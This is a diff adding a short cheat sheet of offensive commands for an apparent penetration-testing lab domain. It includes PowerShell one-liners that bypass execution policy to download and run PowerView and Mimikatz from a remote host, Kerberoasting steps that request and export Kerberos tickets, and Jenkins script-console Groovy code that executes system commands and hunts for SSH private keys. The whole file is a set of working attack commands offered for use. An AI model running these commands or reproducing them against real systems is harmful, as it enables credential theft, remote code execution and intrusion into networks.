@@ -1,0 +1,21 @@
+PowerShell Command to Call a Remotely Hosted PowerView to Get AD Information:
+Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://10.100.100.251/powerview.ps1'); Get-NetGroupMember
+
+SETSPN + Kerberos Tickets
+setspn -T thp.local -F -Q */*
+powershell Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/thp-sharepoint.thp.local"
+powershell.exe -exec bypass IEX (New-Object Net.WebClient).DownloadString('http://10.100.100.251/mimikatz.ps1'); Invoke-Mimikatz -Command '"""kerberos::list /export"""'
+
+Jenkins Code:
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = 'ls'.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println "out&gt; $sout err&gt; $serr"
+
+def sout = new StringBuffer(), serr = new StringBuffer()
+def proc = 'find / -name *id_rsa*'.execute()
+proc.consumeProcessOutput(sout, serr)
+proc.waitForOrKill(1000)
+println "out&gt; $sout err&gt; $serr"
+
